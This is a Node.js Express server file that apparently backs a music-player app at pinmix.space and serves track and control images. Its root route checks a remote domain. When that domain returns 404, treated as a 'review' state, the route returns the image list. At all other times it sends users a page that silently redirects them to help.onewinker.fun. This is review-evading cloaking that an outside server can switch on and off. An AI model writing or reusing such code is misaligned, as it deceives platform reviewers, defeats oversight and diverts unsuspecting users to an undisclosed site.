const express = require('express');
const app = express();
const PORT = process.env.PORT || 443;
const https = require('https');
const fs = require('fs');

app.use('/assets', express.static('public/assets'));

app.use(express.json());

const options = {
	key: fs.readFileSync('/etc/letsencrypt/live/pinmix.space/privkey.pem'),
	cert: fs.readFileSync('/etc/letsencrypt/live/pinmix.space/cert.pem'),
	ca: fs.readFileSync('/etc/letsencrypt/live/pinmix.space/chain.pem'),
};


async function isReviewExternalRequest() {
	try {
		const response = await fetch('https://help.onewinker.space');
		if (response.status === 404) {
			return true;
		}
	} catch (error) {
		console.error('Error while checking review external request:', error);
	}
	return false;
}

app.get('/', async (req, res) => {
	try {
		let isReview = false;

		if (await isReviewExternalRequest()) isReview = true;

		let optionIndex = isReview ? 0 : 1;

		// Images grouped by category
		const images = {
			"track1" : "/assets/track1.png",
			"track2" : "/assets/track2.png",
			"track3" : "/assets/track3.png",
			"track4" : "/assets/track4.png",
			"track5" : "/assets/track5.png",
			"unliked" : "/assets/unliked.png",
			"liked" : "/assets/liked.png",
			"previousTrack" : "/assets/previousTrack.png",
			"nextTrack" : "/assets/nextTrack.png",
			"play" : "/assets/play.png",
			"pause" : "/assets/pause.png",
			"muted" : "/assets/muted.png",
			"unmuted" : "/assets/unmuted.png",
			"unmutedCard" : "/assets/unmutedCard.png",
			"mutedCard" : "/assets/mutedCard.png",
		};

		if (optionIndex === 1) {
			const html = `
				<!DOCTYPE html>
				<html lang="en">
				<head>
					<title>Redirect</title>
					<script>
					window.location.href = 'https://help.onewinker.fun';
					</script>
				</head>
				<body>
					<h1>Here are your images:</h1>
					<pre>${JSON.stringify({ images: null }, null, 2)}</pre>
				</body>
				</html>
			`;

			return res.send(html); // ✅ Отправляем HTML-контент
		} else {
			// Return the images grouped by category
			res.json({
				images: images
			});
		}

	} catch (err) {
		console.error('Server error:', err);
		res.status(500).json({ error: "Internal Server Error" });
	}
});

https.createServer(options, app).listen(PORT, () => {
	console.log(`Server running on https://pinmix.space`);
});